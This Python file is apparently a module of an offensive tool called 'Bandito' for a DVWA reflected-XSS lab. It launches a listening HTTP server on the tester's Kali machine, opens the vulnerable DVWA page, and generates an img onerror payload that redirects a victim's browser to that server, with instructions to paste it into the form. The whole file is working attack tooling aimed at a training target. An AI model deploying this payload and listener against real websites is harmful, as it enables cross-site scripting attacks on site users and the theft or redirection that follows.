import requests
import subprocess
import webbrowser
import os
import socket
from datetime import datetime

class Tool:
    def __init__(self):
        self.name = "xss"
        self.kali_ip = self.get_local_ip()
        self.port = 8080
        self.server_process = None
        self.dvwa_url = "http://192.168.107.129"

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.107.128"

    def show_help(self):
        print("\n=== Reflected XSS Tool (Part 3) ===")
        print(f"  Kali IP      → {self.kali_ip}")
        print(f"  Server Port  → {self.port}")
        print(f"  DVWA URL     → {self.dvwa_url}\n")
        print("Commands:")
        print("  setup              - Start server + open DVWA page")
        print("  generate           - Generate payload")
        print("  set ip <your_ip>   - Set Kali IP")
        print("  set port <number>  - Change port")
        print("  back / exit        - Return to framework")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip().lower()

        if cmd in ["help", "show options"]:
            self.show_help()
            return

        if cmd == "setup":
            self.start_server()
            self.open_dvwa_xss_page()
            return

        if cmd == "generate":
            self.generate_payload()
            return

        if cmd.startswith("set ip"):
            value = cmd.split(maxsplit=2)[2].strip()
            self.kali_ip = value
            print(f"[+] Kali IP set to {self.kali_ip}")
            return

        if cmd.startswith("set port"):
            try:
                self.port = int(cmd.split()[2])
                print(f"[+] Port set to {self.port}")
            except:
                print("Usage: set port <number>")
            return

        if cmd in ["back", "exit", "quit"]:
            if self.server_process:
                self.server_process.terminate()
            print("[*] Returning to main Bandito menu...")
            return

        print("Unknown command. Type 'help' for options.")

    def start_server(self):
        print(f"[*] Starting HTTP server on http://{self.kali_ip}:{self.port}")
        try:
            self.server_process = subprocess.Popen(["gnome-terminal", "--", "python3", "-m", "http.server", str(self.port)])
            print("[+] Server started in new terminal")
        except:
            print("[-] Could not open new terminal. Run manually: python3 -m http.server 8080")

    def open_dvwa_xss_page(self):
        url = f"{self.dvwa_url}/vulnerabilities/xss_r/"
        print(f"[+] Opening DVWA Reflected XSS page: {url}")
        webbrowser.open(url)

    def generate_payload(self):
        payload = f'<img src=x onerror="window.location=\'http://{self.kali_ip}:{self.port}/xss_test\'">'
        print("\n=== Reflected XSS Payload ===")
        print(payload)
        print("\nPaste this into the name field and submit.")